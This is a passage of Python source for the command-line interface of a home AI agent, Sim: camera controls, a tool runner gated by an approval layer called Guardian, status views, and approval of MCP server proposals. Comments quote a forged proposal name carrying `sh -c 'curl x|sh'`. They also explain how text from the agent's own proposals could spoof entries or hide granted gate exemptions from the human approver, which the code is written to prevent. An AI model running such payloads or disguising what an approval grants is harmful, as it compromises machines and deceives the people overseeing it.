        return await _run("cam_state", {"camera": " ".join(rest)})
    if verb in ("show", "stream", "live"):
        if not rest:
            return Outcome(usage)
        mode = rest[-1].lower() if rest[-1].lower() in ("frame", "grid", "full", "stop", "tiled") else ""
        camera = " ".join(rest[:-1] if mode else rest) or "all"
        return await _run("cam_stream", {"camera": camera, "mode": {"tiled": "grid"}.get(mode, mode) or "frame"})
    if verb in ("snapshot", "snap", "picture"):
        return await _run("cam_snapshot", {"camera": " ".join(rest)}) if rest else Outcome(usage)
    if verb in ("light", "spotlight", "ir"):
        if len(rest) < 2:
            return Outcome(usage)
        return await _run("cam_light" if verb != "ir" else "cam_ir",
                          {"camera": " ".join(rest[:-1]), "on": rest[-1].lower() in ("on", "true", "1")})
    if verb == "siren":
        if not rest:
            return Outcome(usage)
        seconds = int(rest[-1]) if rest[-1].isdigit() else None
        camera = " ".join(rest[:-1] if seconds is not None else rest)
        return await _run("cam_siren", {"camera": camera, **({"seconds": seconds} if seconds else {})})
    if verb in ("ptz", "move"):
        if len(rest) < 2:
            return Outcome(usage)
        if rest[-1].isdigit() and len(rest) >= 3 and rest[-2].lower() == "preset":
            return await _run("cam_ptz", {"camera": " ".join(rest[:-2]), "command": "preset", "preset": int(rest[-1])})
        return await _run("cam_ptz", {"camera": " ".join(rest[:-1]), "command": rest[-1].lower()})
    if verb == "recordings":
        if not rest:
            return Outcome(usage)
        period = rest[-1].lower() if rest[-1].lower() in ("today", "yesterday") or re.fullmatch(r"\d+h", rest[-1].lower()) else ""
        camera = " ".join(rest[:-1] if period else rest)
        return await _run("cam_recordings", {"camera": camera, **({"period": period} if period else {})})
    if verb == "watch":
        return await _run("cam_watch", {"on": not rest or rest[0].lower() not in ("off", "stop")})
    if verb == "setup":
        if len(rest) < 3:
            return Outcome("usage: cameras setup <host> <username> <password>")
        return await _run("cam_setup", {"host": rest[0], "username": rest[1], "password": " ".join(rest[2:])}, timeout=60.0)
    return Outcome(f"cameras: unknown verb {verb!r} -- {usage}")


async def _tool_command(args: str, *, bus: BusClient, ledger: LedgerClient,
                        session_id: str, timeout: float = 300.0) -> Outcome:
    """Run any registered tool, from the terminal, through Guardian.

    Fifty tools and sixteen commands: adding a command per tool would
    make the help screen unreadable and still not answer the question a
    person actually has. One command reaching all of them is the better
    trade, and it costs nothing in safety -- this publishes
    `action.proposed` exactly as a Worker does, so Guardian sees it, an
    irreversible call still stops at the approval prompt, and the whole
    thing is ledgered like any other action. The CLI is not a back door
    around the gate; it is another caller in front of it.
    """
    args = (args or "").strip()
    if not args:
        return await _tool_list(ledger)

    name, _, rest = args.partition(" ")
    name = name.strip()
    rest = rest.strip()
    known = await _known_tools(ledger)
    if known and name not in known:
        near = difflib.get_close_matches(name, sorted(known), n=3, cutoff=0.5)
        hint = f"; did you mean {', '.join(near)}?" if near else " -- `tool` lists them all"
        return Outcome(f"no tool called {name!r}{hint}")

    if not rest and name not in _NO_ARG_TOOLS:
        return Outcome(f"{name} takes {describe_arguments(name)}\n"
                       f"  tool {name} {describe_arguments(name)}")

    return await _run_tool(bus=bus, ledger=ledger, tool=name, raw=rest,
                           session_id=session_id, timeout=timeout)


async def _tool_list(ledger: LedgerClient) -> Outcome:
    known = await _known_tools(ledger)
    if not known:
        return Outcome("no tools registered yet -- they announce themselves just after boot.")
    groups: dict[str, list[str]] = {}
    for tool_name, row in sorted(known.items()):
        groups.setdefault(_tool_group(tool_name), []).append(
            f"  {tool_name:22} {row.get('reversibility', '')}")
    lines = [f"{len(known)} tools. `tool <name> <args>` runs one; Guardian gates it the same "
             f"way it gates the model."]
    for group in sorted(groups):
        lines.append(f"\n{group}:")
        lines.extend(groups[group])
    return Outcome("\n".join(lines))


#: Prefix -> the heading it is listed under. A flat list of fifty names
#: is not something anyone reads.
_TOOL_GROUPS: tuple[tuple[str, str], ...] = (
    ("cam_", "the cameras"),
    ("cast_", "media -- the TV"),
    ("kb_", "documents"), ("cal_", "calendar and mail"), ("mail_", "calendar and mail"),
    ("remind", "calendar and mail"), ("sec_", "security"), ("home_", "the house"),
    ("energy_", "energy"), ("media_", "media"), ("git_", "source control"),
    ("run_", "running things"), ("web_", "the web"), ("apply_", "changing code"),
    ("mcp_", "mcp servers"),
)


def _tool_group(name: str) -> str:
    for prefix, group in _TOOL_GROUPS:
        if name.startswith(prefix):
            return group
    return "everything else"


_NO_ARG_TOOLS = frozenset({"kb_status", "sec_self", "sec_posture", "energy_status",
                           "home_describe", "media_now", "self_map", "git_revert",
                           "cast_devices", "cast_show", "cast_stop", "cast_setup", "cam_list"})


async def _known_tools(ledger: LedgerClient) -> dict[str, dict]:
    """The latest registration per tool name, from the Ledger.

    The Ledger rather than a bus query because a registration is an
    append-only fact that survives a restart, and because `capabilities`
    already reads its own stream the same way.
    """
    try:
        events = await ledger.read(TOOLS_STREAM)
    except Exception:  # noqa: BLE001 -- a diagnostic must not raise
        return {}
    latest: dict[str, dict] = {}
    for event in events:
        payload = event.payload or {}
        if payload.get("name"):
            latest[str(payload["name"])] = payload
    return latest


def cli_tool_args(tool: str, raw: str) -> dict:
    """What a person typed, as tool arguments.

    The model writes a two-part marker across two lines. A person types
    one line, so a two-part tool splits on the first space instead --
    `tool remind 20m take the bins out` means what it looks like. JSON
    is accepted whole for anything with a fiddly shape.
    """
    raw = (raw or "").strip()
    if raw.startswith("{"):
        try:
            parsed = json.loads(raw)
        except json.JSONDecodeError:
            return {"__error__": "that is not valid JSON"}
        if isinstance(parsed, dict):
            return parsed
    if "\n" not in raw and tool in MARKER_SPLIT_FIRST_LINE:
        head, _, tail = raw.partition(" ")
        raw = f"{head}\n{tail.strip()}"
    args = args_from_text(tool, raw)
    if args:
        return args
    if "=" in raw:
        out: dict = {}
        for token in _KEY_VALUE.finditer(raw):
            out[token.group(1)] = _coerce(token.group(2).strip().strip('"\''))
        if out:
            return out
    return {}


_KEY_VALUE = re.compile(r"""([A-Za-z_][A-Za-z0-9_]*)=("[^"]*"|'[^']*'|\S+)""")
#: The quoted alternatives come FIRST. With `\S+` leading, it won
#: matched `"two` out of `note="two words"` and the rest of the
#: value was silently dropped.


def _coerce(value: str):
    lowered = value.lower()
    if lowered in ("true", "false"):
        return lowered == "true"
    try:
        return int(value)
    except ValueError:
        pass
    try:
        return float(value)
    except ValueError:
        return value


async def _run_tool(*, bus: BusClient, ledger: LedgerClient, tool: str, raw: str,
                    session_id: str, timeout: float) -> Outcome:
    import asyncio

    args = cli_tool_args(tool, raw)
    if "__error__" in args:
        return Outcome(f"error: {args['__error__']}")

    action_id = uuid.uuid4().hex[:12]
    loop = asyncio.get_running_loop()
    done: asyncio.Future = loop.create_future()

    async def _on_result(message) -> None:
        if not done.done() and message.payload.get("action_id") == action_id:
            done.set_result(("result", message.payload))

    async def _on_denied(message) -> None:
        if not done.done() and message.payload.get("action_id") == action_id:
            done.set_result(("denied", message.payload))

    # Subscribed BEFORE the proposal: a fast tool can answer before a
    # subscription made afterwards exists, and the command would hang
    # for its whole timeout on a call that had already succeeded.
    subs = [await bus.subscribe(topics.ACTION_RESULT, _on_result),
            await bus.subscribe(topics.ACTION_DENIED, _on_denied)]
    try:
        await bus.publish(bus.new(topics.ACTION_PROPOSED, {
            "action_id": action_id, "tool": tool, "args": args,
            "scope": {"paths": [], "network": False},
            # The floor. Guardian recomputes the real class itself and
            # never trusts a proposer's label, so understating here
            # cannot widen anything.
            "reversibility": "reversible",
            "rationale": f"asked for at the terminal by cli:{session_id}",
            "proposed_by": f"interface:{session_id}",
        }))
        try:
            kind, payload = await asyncio.wait_for(done, timeout=timeout)
        except asyncio.TimeoutError:
            return Outcome(f"{tool} did not finish within {timeout:.0f}s "
                           f"(action {action_id}; it may still be running)")
    finally:
        for sub in subs:
            await sub.unsubscribe()

    if kind == "denied":
        reasons = ", ".join(payload.get("reasons") or ()) or "no reason given"
        return Outcome(f"Guardian denied {tool} ({payload.get('layer', 'policy')}): {reasons}")

    body = payload.get("stdout_preview") or ""
    ref = payload.get("output_ref") or ""
    if ref:
        try:
            body = (await ledger.get_blob(ref)).decode("utf-8", "replace")
        except Exception:  # noqa: BLE001 -- the preview is still worth printing
            pass
    if not payload.get("ok"):
        error = payload.get("error") or "failed"
        return Outcome(f"{tool} failed: {error}" + (f"\n{body}" if body else ""))
    took = payload.get("duration_ms")
    suffix = f"  ({took} ms)" if isinstance(took, int) and took > 50 else ""
    return Outcome((body or f"{tool} finished with no output") + suffix)


#: Domain -> what it is for, in the words a person would use. The order
#: is the order they are printed in.
_DOMAIN_BLURB: tuple[tuple[str, str], ...] = (
    ("knowledge", "your own documents, searchable"),
    ("pim", "calendar, mail and reminders"),
    ("home", "the house, through Home Assistant"),
    ("energy", "what the house uses and what it costs"),
    ("media", "what is playing, and running it"),
    ("security", "this machine's own exposure"),
)


async def _domains_command(ledger: LedgerClient, args: str = "") -> Outcome:
    """Which domains are set up, which answer, and what to do next.

    Reads the same capability probes `capabilities` does, and hands the
    rows to `render.domains_panel` rather than formatting here -- so it
    wraps to the real terminal and so the layout is testable without a
    Ledger.

    Three states, not two. "Nothing set up yet" and "set up and not
    answering" are different facts, and a view that showed them the same
    way made a fresh install look like a system on fire.
    """
    try:
        events = await ledger.read(CAPABILITIES_STREAM)
    except Exception as exc:  # noqa: BLE001 -- a diagnostic must not raise
        return Outcome(f"could not read the capability probes: {exc!r}")
    latest: dict[str, dict] = {}
    for event in events:
        payload = event.payload or {}
        name = str(payload.get("name") or "")
        if name.startswith("connector:"):
            latest[name[len("connector:"):]] = payload
    if not latest:
        return Outcome("no domain probes recorded yet -- they run just after boot, so try "
                       "again in a moment.")

    # `domains knowledge` narrows to one. The command took no arguments
    # and silently ignored anything typed after it, which reads as a
    # command that does not work rather than one that does not filter.
    wanted = args.strip().lower()
    known = {name for name, _ in _DOMAIN_BLURB}
    if wanted and wanted not in known:
        near = difflib.get_close_matches(wanted, sorted(known), n=3, cutoff=0.4)
        hint = f"; did you mean {', '.join(near)}?" if near else ""
        return Outcome(f"no domain called {wanted!r}{hint}. "
                       f"They are: {', '.join(sorted(known))}.")

    rows: list[dict] = []
    for domain, blurb in _DOMAIN_BLURB:
        if wanted and domain != wanted:
            continue
        if domain == "pim":
            accounts = {name: row for name, row in latest.items()
                        if name.startswith(("imap:", "caldav:"))}
            if not accounts:
                rows.append({"name": domain, "blurb": blurb, "state": "todo", "detail": "",
                             "fix": "add [[execution.pim_accounts]], then "
                                    "`simorgh vault add imap:<name>`"})
                continue
            for name, row in sorted(accounts.items()):
                rows.append({**_domain_row(row), "name": name, "blurb": blurb})
            continue
        row = latest.get(domain)
        if row is None:
            rows.append({"name": domain, "blurb": blurb, "state": "todo",
                         "detail": "", "fix": "not probed yet"})
            continue
        rows.append({**_domain_row(row), "name": domain, "blurb": blurb})

    # `color_enabled()` rather than a bare True: it honours NO_COLOR,
    # which is what a person piping this into a file or a log expects.
    return Outcome(render_mod.domains_panel(rows, enabled=render_mod.color_enabled()))


def _domain_row(payload: dict) -> dict:
    """A probe payload as a panel row.

    `missing` is what separates the two failures: non-empty means
    nothing has been set up, which is not a fault; empty on a failed
    probe means it IS set up and is not answering, which is.
    """
    if payload.get("ok"):
        state = "ready"
    elif payload.get("missing"):
        state = "todo"
    else:
        state = "broken"
    return {"state": state, "detail": str(payload.get("detail") or "").strip(),
            "fix": str(payload.get("fix") or "").strip()}


async def _alerts_command(ledger: LedgerClient, args: str = "") -> Outcome:
    """What the monitors have raised.

    The alert framework produces all of this and nothing displayed it,
    so a `warn` held back by the rate limit or by quiet hours was
    invisible until the digest went out -- and the digest is exactly
    where a person is least likely to be looking when something is
    wrong now.
    """
    try:
        events = await ledger.read(ALERTS_STREAM)
    except Exception as exc:  # noqa: BLE001
        return Outcome(f"could not read the alerts: {exc!r}")
    if not events:
        return Outcome("nothing has been raised. Monitors run on idle ticks; with none "
                       "registered yet this stays empty, which is the honest answer rather "
                       "than a clean bill of health.")

    open_alerts: dict[tuple[str, str], dict] = {}
    cleared = 0
    for event in events:
        payload = event.payload or {}
        key = (str(payload.get("monitor") or ""), str(payload.get("key") or ""))
        if event.type == "cleared":
            open_alerts.pop(key, None)
            cleared += 1
        else:
            open_alerts[key] = {**payload, "at": event.ts}

    if args.strip().lower() in ("all", "history"):
        lines = [f"  {event.type:8} {(event.payload or {}).get('monitor', ''):14} "
                 f"{(event.payload or {}).get('message', '')}" for event in events[-40:]]
        return Outcome(f"{len(events)} alert event(s), most recent last:\n" + "\n".join(lines))

    if not open_alerts:
        return Outcome(f"nothing open. {cleared} alert(s) have been raised and resolved.")

    order = {"critical": 0, "warn": 1, "info": 2}
    rows = sorted(open_alerts.values(),
                  key=lambda row: (order.get(str(row.get("severity")), 3),
                                    str(row.get("monitor"))))
    lines = []
    for row in rows:
        severity = str(row.get("severity") or "info")
        again = " REGRESSED" if float(row.get("reopened") or 0) else ""
        lines.append(f"  [{severity}]{again} {row.get('monitor')}: {row.get('message')}")
        # Where it went, and why. "Why didn't I hear about this" has an
        # answer, and this is it.
        channel, reason = row.get("channel"), str(row.get("reason") or "")
        if channel and channel != "notify":
            lines.append(f"        held for the {channel}: {reason}")
    held = sum(1 for row in rows if row.get("channel") == "digest")
    header = f"{len(rows)} open alert(s)"
    if held:
        header += f", {held} waiting for the daily digest"
    return Outcome(header + ":\n" + "\n".join(lines) + "\n(`alerts all` for the full history)")


async def _config_command(ledger: LedgerClient, args: str = "") -> Outcome:
    """The settings actually in force, and any that nothing reads.

    Every subsystem's `from_mapping` silently ignores a key it does not
    recognise, so a typo in simorgh.toml is indistinguishable from a
    setting that works: the file changes, the system does not, and
    nothing says so. The Kernel warns about it once at boot, where it
    scrolls past; this makes it answerable afterwards.

    `source` matters as much as the value. "It is the default" and "you
    set it to the same thing as the default" look identical in the
    value alone, and only one of them means a config line is doing
    nothing.
    """
    try:
        events = await ledger.read(CONFIG_STREAM)
    except Exception as exc:  # noqa: BLE001 -- a diagnostic must not raise
        return Outcome(f"could not read the config record: {exc!r}")
    if not events:
        return Outcome("no config has been recorded yet -- the Kernel writes it at boot, so "
                       "this is empty until the next start.")
    payload = events[-1].payload or {}
    sections = payload.get("sections") or {}

    wanted = args.strip().lower()
    lines: list[str] = []
    where = payload.get("path") or "(no simorgh.toml found -- every value is a default)"
    lines.append(f"config from {where}")

    for name in sorted(sections):
        if wanted and not name.startswith(wanted):
            continue
        fields = sections[name] or {}
        if "error" in fields:
            lines.append(f"\n[{name}]  {fields['error']}")
            continue
        from_file = {k: v for k, v in fields.items() if v.get("source") == "file"}
        if wanted:
            lines.append(f"\n[{name}]  {len(fields)} setting(s), {len(from_file)} from the file")
            for key in sorted(fields):
                mark = "*" if fields[key].get("source") == "file" else " "
                lines.append(f"  {mark} {key:34} {_short(fields[key].get('value'))}")
        elif from_file:
            lines.append(f"\n[{name}]  {len(from_file)} of {len(fields)} setting(s) set in the file")
            for key in sorted(from_file):
                lines.append(f"  * {key:34} {_short(from_file[key].get('value'))}")
        else:
            lines.append(f"\n[{name}]  all {len(fields)} setting(s) at their defaults")

    dead_sections = payload.get("dead_sections") or []
    dead_fields = payload.get("dead_fields") or []
    if dead_sections:
        lines.append("\nsections nothing reads: " + ", ".join(dead_sections))
    if dead_fields:
        lines.append("settings nothing reads: " + ", ".join(dead_fields))
    if not wanted:
        lines.append("\n`config <section>` shows every setting in one section; "
                     "`*` marks the ones your file sets.")
    return Outcome("\n".join(lines))


def _short(value, width: int = 60) -> str:
    text = json.dumps(value) if not isinstance(value, str) else value
    return text if len(text) <= width else text[: width - 1] + "\u2026"


async def _capabilities_command(ledger: LedgerClient) -> Outcome:
    """What Sim can actually reach right now.

    Half the toolset stands on something outside this repository -- Node,
    a bundled Chromium, an optional pip package, a Docker daemon. Each is
    allowed to be absent and every tool refuses cleanly, but "absent" was
    only ever discoverable by asking Sim to do the thing and watching it
    fail. Execution has probed all of it since boot and written the
    answers to the ledger; nothing read them back.

    Latest result per probe, since the stream is append-only and
    re-probed after a package install.
    """
    try:
        events = await ledger.read(CAPABILITIES_STREAM)
    except Exception as exc:  # noqa: BLE001 -- a diagnostic must not raise
        return Outcome(f"could not read capability probes: {exc!r}", exit_repl=False)
    if not events:
        return Outcome(
            "no capability probes recorded yet -- they run just after boot, so try again in a moment.",
            exit_repl=False,
        )
    latest: dict[str, dict] = {}
    for event in events:
        payload = event.payload or {}
        name = str(payload.get("name") or "")
        if name:
            latest[name] = payload
    lines = []
    for name in sorted(latest):
        payload = latest[name]
        mark = "yes" if payload.get("ok") else "NO "
        tools = ", ".join(payload.get("tools") or ())
        detail = str(payload.get("detail") or "").strip()
        line = f"  [{mark}] {name}"
        if tools:
            line += f"  ({tools})"
        if detail:
            line += f"\n        {detail}"
        lines.append(line)
    missing = [n for n, p in latest.items() if not p.get("ok")]
    header = f"{len(latest) - len(missing)}/{len(latest)} capabilities available"
    if missing:
        header += f" -- missing: {', '.join(sorted(missing))}"
    return Outcome(header + "\n" + "\n".join(lines), exit_repl=False)


async def _mcp_pending_proposals(ledger: LedgerClient) -> dict[str, dict]:
    """The latest event per `proposal_id`, filtered to still-`pending`
    (an `approved`/`rejected` event for the same id supersedes it) --
    `execution/tools.py::ProposeMcpServerTool`'s own docstring has the
    full design: this stream is the one durable record of what Sim has
    asked for and what a human has decided."""
    events = await ledger.read(MCP_PROPOSALS_STREAM)
    latest: dict[str, dict] = {}
    for event in events:
        proposal_id = event.payload.get("proposal_id")
        if proposal_id:
            latest[proposal_id] = event.payload
    return {pid: p for pid, p in latest.items() if p.get("status") == "pending"}


async def _mcp_active_tools_line(bus: BusClient) -> str:
    try:
        reply = await bus.request(bus.new(topics.WORLD_ENV_QUERY, {"what": "tools", "args": {}}), timeout=3.0)
    except TimeoutError:
        return "active MCP tools: unavailable (no response)"
    except Exception as exc:  # noqa: BLE001 -- a status line reporting its own failure, never a crash
        return f"active MCP tools: error ({exc!r})"
    names = sorted(t["name"] for t in reply.payload.get("tools", []) if t.get("provider") == "mcp")
    return "active MCP tools: " + (", ".join(names) if names else "none configured")


def _toml_string(value: str) -> str:
    escaped = value.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
    return f'"{escaped}"'


def _toml_string_array(items: list[str]) -> str:
    return "[" + ", ".join(_toml_string(item) for item in items) + "]"


def _mcp_server_toml_block(proposal: dict) -> str:
    """A standalone `[[execution.mcp_servers]]` block, appended to the
    end of the file rather than parsing-and-rewriting the whole
    document -- TOML's array-of-tables syntax allows a new element
    anywhere, so this never touches (or risks corrupting/reformatting)
    anything already in `simorgh.toml`, comments included."""
    lines = ["", "[[execution.mcp_servers]]",
             f"name = {_toml_string(proposal['name'])}",
             f"command = {_toml_string(proposal['command'])}"]
    if proposal.get("args"):
        lines.append(f"args = {_toml_string_array(proposal['args'])}")
    if proposal.get("read_only_tools"):
        lines.append(f"read_only_tools = {_toml_string_array(proposal['read_only_tools'])}")
    if proposal.get("env_keys"):
        # Never a real value -- Sim only ever proposes the variable
        # *names* a server needs (`ProposeMcpServerTool`'s own
        # validation); the human adds an `env` table by hand if the
        # server actually needs one.
        lines.append(f"# env vars this server needs (add real values yourself): {', '.join(proposal['env_keys'])}")
    # A `#` comment ends at the first newline in TOML -- anything after
    # one becomes a bare line with no `key = value`, which
    # `tomllib.load` refuses outright ("Expected '=' after a key in a
    # key/value pair"). This was unreachable while `reason` was
    # truncated to its first line by the PROPOSE_MCP_SERVER marker bug;
    # fixing that bug today (cognition/parser.py) legitimately restored
    # multi-line reasons, and one committed to `simorgh.toml` by
    # `mcp approve` broke the file Sim reads at its next boot (observer,
    # 2026-09-08). Collapsed to one line here, same as `preview()`
    # elsewhere in this codebase collapses a narrated multi-line value.
    reason = " ".join(str(proposal.get("reason", "")).split())
    lines.append(f"# approved via `mcp approve` -- Sim's own reason: {reason}")
    return "\n".join(lines) + "\n"


#: How many names of a granted-tool or wanted-secret list to print.
_MCP_LIST_SHOWN = 12


def _named_list(names: list[str]) -> str:
    """The names, capped BY COUNT, saying how many are not shown.

    `one_safe_line(", ".join(names))` cut the joined string at 200
    characters and ended it with an ellipsis that says nothing. A
    proposal declaring 200 read-only tools with `wire_money` at position
    150 rendered as twelve `read_thing_NNN` and a `…`, so the field
    added to show what an approval grants hid it again -- silently, and
    at the proposer's choice of ordering (observer, 2026-09-10). A
    truncation the reader cannot see the size of is the same failure as
    no field at all.
    """
    shown = [render_mod.one_safe_line(name, limit=60) for name in names[:_MCP_LIST_SHOWN]]
    hidden = len(names) - len(shown)
    if hidden > 0:
        shown.append(f"...and {hidden} more NOT SHOWN -- approving grants all {len(names)}")
    return ", ".join(shown)


async def _mcp_command(args: str, *, bus: BusClient, ledger: LedgerClient, clock) -> Outcome:
    parts = args.split(None, 1)
    sub = parts[0] if parts else ""

    if sub == "approve":
        if len(parts) < 2 or not parts[1].strip():
            return Outcome("usage: mcp approve <proposal_id>")
        proposal_id = parts[1].strip()
        pending = await _mcp_pending_proposals(ledger)
        proposal = pending.get(proposal_id)
        if proposal is None:
            return Outcome(f"no pending proposal {proposal_id!r} -- see `mcp` for the current list")
        with _SIMORGH_TOML_PATH.open("a", encoding="utf-8") as fh:
            fh.write(_mcp_server_toml_block(proposal))
        await ledger.append(MCP_PROPOSALS_STREAM, Event(
            stream=MCP_PROPOSALS_STREAM, type="approved", ts=clock.now(), trace_id="", causation_id=None,
            payload={**proposal, "status": "approved"},
        ))
        return Outcome(f"approved: wrote {proposal['name']!r} to {_SIMORGH_TOML_PATH} -- restart Sim to load it")

    if sub == "reject":
        if len(parts) < 2 or not parts[1].strip():
            return Outcome("usage: mcp reject <proposal_id> [reason]")
        rest = parts[1].split(None, 1)
        proposal_id, reason = rest[0], (rest[1] if len(rest) > 1 else "")
        pending = await _mcp_pending_proposals(ledger)
        proposal = pending.get(proposal_id)
        if proposal is None:
            return Outcome(f"no pending proposal {proposal_id!r} -- see `mcp` for the current list")
        await ledger.append(MCP_PROPOSALS_STREAM, Event(
            stream=MCP_PROPOSALS_STREAM, type="rejected", ts=clock.now(), trace_id="", causation_id=None,
            payload={**proposal, "status": "rejected", "rejection_reason": reason},
        ))
        return Outcome(f"rejected: {proposal['name']!r}" + (f" -- {reason}" if reason else ""))

    # bare `mcp`: what's pending, and what's already running
    pending = await _mcp_pending_proposals(ledger)
    lines: list[str] = []
    if pending:
        lines.append(f"{len(pending)} pending MCP server proposal(s):")
        for proposal_id, proposal in pending.items():
            # Everything on this line is text the PROPOSER wrote, and
            # only `reason` was sanitised. A newline in `name` forged a
            # whole extra listing entry -- `fs\n  99999999  evil  (sh -c
            # 'curl x|sh')` printed as two proposals, the second one
            # entirely invented, and pushed the real proposal's own
            # command and reason under it; an escape in `command`
            # cleared the screen (observer, 2026-09-10). That is the
            # same padding attack `one_safe_line` was applied to
            # `reason` for, on the fields that say WHICH server this is.
            command_line = render_mod.one_safe_line(
                " ".join([proposal.get("command", ""), *proposal.get("args", [])]))
            name = render_mod.one_safe_line(str(proposal.get("name", "")), limit=60)
            lines.append(f"  {proposal_id}  {name}  ({command_line})")
            lines.append(f"    reason: {render_mod.one_safe_line(proposal.get('reason', ''))}")
            # The two fields that decide what approving this GRANTS, and
            # neither was shown. `read_only_tools` is not a label:
            # `execution/mcp.py` registers each named tool with
            # `reversibility="read_only"`, and Guardian allows a
            # read-only tool in EVERY posture, `locked` included. So the
            # person was granting a permanent gate exemption they had
            # never seen, to tools they had never been told the names of
            # (observer, 2026-09-10). The reason is rendered as one line
            # for the same reason: a multi-line reason could pad itself
            # out to look like more listing entries.
            granted = [str(t) for t in (proposal.get("read_only_tools") or ())]
            if granted:
                lines.append("    GRANTS (Guardian never gates these, even when locked): "
                             + _named_list(granted))
            wanted = [str(k) for k in (proposal.get("env_keys") or ())]
            if wanted:
                lines.append("    wants these secrets: " + _named_list(wanted))
        lines.append("  `mcp approve <id>` or `mcp reject <id> [reason]`")
    else:
        lines.append("no pending MCP server proposals")
    lines.append(await _mcp_active_tools_line(bus))
    return Outcome("\n".join(lines))


__all__ = ["dispatch", "run_shell", "Outcome"]
